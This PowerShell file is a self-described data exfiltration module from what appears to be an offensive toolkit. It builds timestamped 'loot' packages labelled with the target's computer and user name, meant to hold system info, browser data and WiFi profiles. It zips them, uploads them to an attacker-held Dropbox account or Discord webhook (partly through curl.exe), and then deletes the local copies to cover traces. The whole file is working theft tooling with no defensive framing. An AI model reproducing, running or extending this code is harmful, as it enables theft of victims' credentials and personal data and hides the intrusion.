<#
.SYNOPSIS
    Data exfiltration module
.DESCRIPTION
    Supports multiple exfiltration methods: Dropbox, Discord, and file compression
#>

function Compress-LootFolder {
    param(
        [Parameter(Mandatory=$true)]
        [string]$SourcePath,
        
        [string]$DestinationPath,
        
        [switch]$DeleteSource
    )

    if (-not (Test-Path $SourcePath)) {
        Write-Output "Source path does not exist: $SourcePath"
        return $null
    }

    if (-not $DestinationPath) {
        $DestinationPath = "$SourcePath.zip"
    }

    try {
        Compress-Archive -Path $SourcePath -DestinationPath $DestinationPath -CompressionLevel Optimal -Force
        Write-Output "Archive created: $DestinationPath"
        
        if ($DeleteSource) {
            Remove-Item -Path $SourcePath -Recurse -Force -ErrorAction SilentlyContinue
            Write-Output "Source folder deleted"
        }
        
        return $DestinationPath
    } catch {
        Write-Output "Error creating archive: $($_.Exception.Message)"
        return $null
    }
}

function Send-ToDropbox {
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        
        [Parameter(Mandatory=$true)]
        [string]$AccessToken,
        
        [string]$DropboxPath
    )

    if (-not (Test-Path $FilePath)) {
        Write-Output "File not found: $FilePath"
        return $false
    }

    if (-not $DropboxPath) {
        $DropboxPath = "/" + (Split-Path $FilePath -Leaf)
    }

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        $args = @{
            path = $DropboxPath
            mode = "add"
            autorename = $true
            mute = $false
        } | ConvertTo-Json -Compress

        $headers = @{
            "Authorization" = "Bearer $AccessToken"
            "Dropbox-API-Arg" = $args
            "Content-Type" = "application/octet-stream"
        }

        $response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
            -Method Post `
            -Headers $headers `
            -Body $fileBytes

        Write-Output "File uploaded to Dropbox: $($response.path_display)"
        return $true
    } catch {
        Write-Output "Dropbox upload failed: $($_.Exception.Message)"
        return $false
    }
}

function Send-ToDiscord {
    param(
        [Parameter(Mandatory=$true)]
        [string]$WebhookUrl,
        
        [string]$FilePath,
        
        [string]$Message,
        
        [string]$Username = $env:USERNAME
    )

    try {
        if ($Message) {
            $body = @{
                username = $Username
                content = $Message
            } | ConvertTo-Json

            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json' | Out-Null
            Write-Output "Message sent to Discord"
        }

        if ($FilePath -and (Test-Path $FilePath)) {
            if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
                $curlOutput = & curl.exe -F "file1=@$FilePath" $WebhookUrl 2>&1
                Write-Output "File uploaded to Discord: $FilePath"
            } else {
                Write-Output "curl.exe not found - cannot upload file"
            }
        }

        return $true
    } catch {
        Write-Output "Discord upload failed: $($_.Exception.Message)"
        return $false
    }
}

function New-LootPackage {
    param(
        [Parameter(Mandatory=$true)]
        [string]$OutputFolder,
        
        [hashtable]$SystemInfo,
        [array]$BrowserData,
        [array]$WiFiProfiles,
        [hashtable]$UserInfo,
        
        [string]$CustomName
    )

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $folderName = if ($CustomName) { 
        "$CustomName`_$timestamp" 
    } else { 
        "$env:COMPUTERNAME`_$env:USERNAME`_$timestamp" 
    }
    
    $lootPath = Join-Path $OutputFolder $folderName
    
    if (-not (Test-Path $lootPath)) {
        New-Item -Path $lootPath -ItemType Directory -Force | Out-Null
    }

    $masterReport = @"
====================================================================================================
RECONNAISSANCE PACKAGE
====================================================================================================
Target Computer:        $env:COMPUTERNAME
Target User:            $env:USERNAME
Collection Time:        $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Package ID:             $folderName
====================================================================================================

"@

    $masterReport | Out-File -FilePath (Join-Path $lootPath "00_PACKAGE_INFO.txt") -Encoding UTF8

    Write-Output "Loot package created: $lootPath"
    return $lootPath
}

function Invoke-DataExfiltration {
    param(
        [Parameter(Mandatory=$true)]
        [string]$LootFolder,
        
        [string]$DropboxToken,
        [string]$DiscordWebhook,
        
        [switch]$CompressFirst,
        [switch]$CleanupAfter
    )

    $success = @()
    $zipPath = $null

    if ($CompressFirst) {
        Write-Output "Compressing loot folder..."
        $zipPath = Compress-LootFolder -SourcePath $LootFolder -DeleteSource:$false
        
        if (-not $zipPath) {
            Write-Output "Compression failed - aborting exfiltration"
            return $false
        }
    }

    $fileToSend = if ($zipPath) { $zipPath } else { $LootFolder }

    if ($DropboxToken -and $DropboxToken -ne "PLACEHOLDER_DROPBOX_TOKEN") {
        Write-Output "Attempting Dropbox upload..."
        if (Test-Path $fileToSend -PathType Leaf) {
            $result = Send-ToDropbox -FilePath $fileToSend -AccessToken $DropboxToken
            if ($result) { $success += "Dropbox" }
        } else {
            Write-Output "Dropbox requires compressed file"
        }
    }

    if ($DiscordWebhook -and $DiscordWebhook -ne "PLACEHOLDER_DISCORD_WEBHOOK") {
        Write-Output "Attempting Discord upload..."
        if (Test-Path $fileToSend -PathType Leaf) {
            $message = "Package from $env:COMPUTERNAME\$env:USERNAME collected at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
            $result = Send-ToDiscord -WebhookUrl $DiscordWebhook -FilePath $fileToSend -Message $message
            if ($result) { $success += "Discord" }
        } else {
            Write-Output "Discord requires compressed file"
        }
    }

    if ($CleanupAfter -and $success.Count -gt 0) {
        Write-Output "Cleaning up local files..."
        if ($zipPath -and (Test-Path $zipPath)) {
            Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
        }
        if (Test-Path $LootFolder) {
            Remove-Item -Path $LootFolder -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    if ($success.Count -gt 0) {
        Write-Output "Exfiltration successful via: $($success -join ', ')"
        return $true
    } else {
        Write-Output "All exfiltration methods failed"
        return $false
    }
}